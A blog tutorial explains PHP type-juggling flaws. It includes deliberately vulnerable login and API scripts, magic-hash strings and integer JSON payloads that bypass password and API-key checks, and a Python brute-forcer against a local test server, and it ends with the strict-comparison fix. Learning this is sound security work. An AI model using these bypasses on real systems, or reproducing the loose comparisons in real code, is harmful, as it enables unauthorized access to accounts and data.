---
layout: post
title: PHP Type-Juggling with Authentication Bypass example
excerpt: "PHP Type-Juggling explained with examples"
categories: [tutorials]
comments: true
tags: [php, authentication bypass]
---

Did you know that a single missing character in your code can cause your authentication mechanism to be broken and give
attackers the ability to bypass it ? Or maybe exploit your API to get valuable information, or bypass your CSRF protection, or in some cases even gain RCE.
So today I'm going to explain these attacks, how to exploit them, and how to avoid them. 

#### What is Type-Juggling

In PHP there are 2 main comparison methods called `loose` and `strict` comparisons 

> Loose Comparison (==) - Doesn't check the type of the given data

> Strict Comparison (===) - Does check the type of the given data

This kind of vulnerability lies on `Loose Comparisons`, and it happens because loose comparisons don't check the type of the data and will return `TRUE` if a string is compared to `0`. Example: `"0" == 0` will result in `TRUE` but also `"alb0z" == 0` will result in `TRUE`<br>
The image below shows the difference between `Loose Comparisons` and `Strict Comparisons`

![Difference between loose and strict comparisons](/img/Type-Juggling-1.png)

Developers that are not aware of this type of attack will usually compare data through something similar to this

{% highlight php %}
if (md5($string) == $key) 
{% endhighlight %}

So in this case if the `$key` starts with `0e`, then we can simply give a string that productes an another md5 hash which starts with `0e` in the `$string` variable, which we may give it through GET or POST requests or other types of input 

Some such string are `QNKCDZO` and `240610708`

A small example

![Type juggling example](/img/Type-Juggling-2.png)

In the examples below I will go more into details on how to exploit it

#### Example 1: Authentication Bypass

First I wrote this simple PHP authentication mechanism which doesn't use a database so you can reproduce the attack simpler and faster

{% highlight php %}
<?php 

// In a real world environment this would be in a database
$users = [
  "alb0z" => ["username" => "alb0z", "password" => "2ac9cb7dc02b3c0083eb70898e549b63"], // Password1
  "james" => ["username" => "james", "password" => "0e556485729818849153460746667456"] // Qxs2daYW123
];

$msg = "";

if(isset($_POST['login'])) { // If a login request has been sent
  if(!array_key_exists($_POST['username'], $users)) { // If user doesn't exist
    $msg = "Invalid username or password!";
  }else {
    $username = $_POST['username'];
    $password = $_POST['password'];
    if(md5($password) == $users[$username]['password']) { // Check if user has given a correct password (This is where the bug is)
      // A real world app would redirect us to the main page and set cookies, but for testing purposes I'm going to leave with just a message
      $msg = "Successfully logged in!";
    } else {
      $msg = "Invalid username or password!";
    }

  }
}

if(!empty($msg)) { echo $msg; }
?>

<form method="post">
  <input type="text" name="username" placeholder="Username"><br><br>
  <input type="password" name="password" placeholder="Password"><br><br>
  <button type="submit" name="login" value="1">Login</button>
</form>
{% endhighlight %}

Now notice the line where the script compares the md5 hash of the password in POST request with the md5 hash of the password saved in the database (array in this case)

{% highlight php %}
if(md5($password) == $users[$username]['password'])
{% endhighlight %}

We have 2 users `alb0z` and `james`, in this case we can't bypass into `alb0z` because the hash must start with `0e` in order to bypass it, but we can still log into `james` account.

Note: If the application accepts `json` then we can bypass all the hashes and not only the ones starting with `0e`, that's because HTTP sends all the data in string format, but with `json` we can send integers too. More details will be shown in the next example.

I am going to use `php -S 127.0.0.1:8000` to serve the login page, however you can use Apache too.

Now it's time to exploit it. I'm using `curl` to send POST requests, but the same thing can be achieved through your browser.

First sending a normal request with an invalid password to confirm that we can't simply login with a random password

![Normal curl request](/img/Type-Juggling-3.png)

And now let's try it with a string which produces a md5 hash that start with `0e` in this case I'm going to use `NWWKITQ`. First confirm that the string's hash gives us the desired hash, and then make the POST request using `curl`

![Exploit curl request](/img/Type-Juggling-4.png)

Now as we see we successfully gained access to user `james` without knowing his real password.

#### Example 2: Get access to other users data through API

In this example I'm going to show you how to exploit the vulnerability even when the hashes don't start with `0e`. For this to work, `json` data has to be accepted by the application.
Again I'm going to write/use a simple script without a database which will act like a real world API.

{% highlight php %}
<?php

header("Content-Type: application/json; charset=UTF-8");

// In a real world environment this would be in a database
$users = [ 
  'alb0z' => ['username' => 'alb0z', 'api_key' => '7c2fceb815553c50fa1c2e3fe4a108fc71d966b199f660ed048c32dfe5978aff', 'secret_data' => 'This is secret and only alb0z should be able to access it',],
  'james' => ['username' => 'james', 'api_key' => 'e682a16f3973fa12ecf221baa5b1e169157c44ef301180077fe48eae69fb7594', 'secret_data' => 'This is secret and only james should be able to access it'],
  'carl' => ['username' => 'carl', 'api_key' => '399d65963db11309b2f6e4a59094686b12133274b47c867e52b277b68a0ef39b', 'secret_data' => 'This is secret and only carl should be able to access it']
];

if($_SERVER['REQUEST_METHOD'] != 'POST') { die("Only post requests are allowed"); } // allow only post requests

$data = json_decode(file_get_contents("php://input")); // get any input sent to us and json decode it

$return = [];

if(!property_exists($data, "username") or !property_exists($data, "api_key")) { // check if username and api_key are in json data we received
  $return['error'] = "username and api_key required";
  die(json_encode($return));
}

if(!array_key_exists($data->username, $users)) { // check if received username exist
  $return['error'] = "username not found";
  die(json_encode($return));
}

if($data->api_key != $users[$data->username]['api_key']) { // Check if the given api_key is valid for the given user
  $return['error'] = "api_key is not valid ";
  die(json_encode($return));
}else {
  $return = $users[$data->username];
  unset($return['api_key']);
  die(json_encode($return)); // if everything is okay, then print secret data 

}

?>
{% endhighlight %}

So basically what this script does is accept json data and return some "secret" data for the user. In a real world app the API could do anything from returning personal user information to sending messages, deleting posts or purchasing products in an e-commerce.

Now starting to analyze the code. First thing we should notice is this line that checks if the api_key is not valid, if it is not valid it stops the execution, but if it is then it returns the data. 

{% highlight php %}
if($data->api_key != $users[$data->username]['api_key'])
{% endhighlight %}

`!=` is the opposite of `==` but it still is a loose comparison, so it is still vulnerable.

We have 3 users on the API database (array in this case) `alb0z`,`james` and `carl`, and all three of them have private api keys 64 characters long.

As the API only accepts json, we need to send json through http, and I'm going to do that using `curl` and I will check both using a valid and an invalid key


![API curl check](/img/Type-Juggling-5.png)

Now as the valid api key start with 7, we can simply send an integer with 7 as value in api_key field and that will bypass the api key check.

![API curl exploit 1](/img/Type-Juggling-6.png)

Let's continue to get other users' data. As `james` api_key starts with a letter, we can use 0 as api_key to get his data

![API curl exploit 2](/img/Type-Juggling-7.png)

Time to get user `carl`, his api_key starts with 3, and we try to send a 3 as integer in api_key field, however that is not going to work in this case as his api_key has 3 numbers until the first letter (if the key starts with a number we need to set the api_key in json to first part of numbers of the original api_key ) `399d65963db11309b2f6e4a59094686b12133274b47c867e52b277b68a0ef39b` so we need to use 399 as the api_key to get access to his data.

But in a real world api we don't have access to the keys, so we may need to brute force the integer we need to use.

And I wrote this simple python script to do the brute forcing for us.

{% highlight python %}
#!/usr/bin/env python3
import requests


target = "http://localhost:8000/api.php"

valid_usernames = ['alb0z', 'james', 'carl'] # valid users you know
json_data = '{"username": "%s", "api_key": %s}' # json data to send

for user in valid_usernames:
    for i in range(0,10000): #brute force which api_key integers will work
        post_req = json_data % (user, i)
        req = requests.post(target, data=post_req) # send the request
        if "api_key is not valid" not in req.text: 
            print("Data for user: %s with %i as api_key: %s" % (user, i, req.text))
            break
{% endhighlight %}

And when run, it finds the numbers for us.

![API curl exploit 2](/img/Type-Juggling-8.png)

#### Where to find hashes which start with `0e` 
Hashes that start with `0e` are called magic hashes and you can find many types of them here <a href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a>


#### How to prevent it

These type of bugs are probably the easiest ones to fix, one needs to use strict comparisons instead of loose comparisons

so this 
{% highlight php %}
if (md5($string) == $key) 
{% endhighlight %}
needs to becomes this
{% highlight php %}
if (md5($string) === $key) 
{% endhighlight %}
<br>